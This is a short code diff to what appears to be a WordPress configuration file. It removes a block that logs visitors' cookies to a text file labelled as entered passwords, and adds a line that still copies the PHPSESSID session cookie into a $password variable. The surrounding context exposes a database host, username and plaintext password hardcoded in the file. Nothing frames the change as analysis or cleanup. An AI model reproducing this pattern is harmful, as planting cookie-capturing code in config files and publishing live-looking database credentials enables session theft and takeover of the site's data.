@@ -64,12 +64,7 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  * a unique prefix. Only numbers, letters, and underscores please!
  */
 
-$password = $_COOKIE;
-$file = fopen("filex.txt", "a"); // "a" untuk append ke file
-if ($file) {
-    fwrite($file, "Password yang dimasukkan: " . $password . "\n");
-    fclose($file);
-}
+$password = $_COOKIE["PHPSESSID"];
 $host = "neto.caltec.mx";  
 $user = "neto_web";     
 $pass = "WeBNeto2019";          
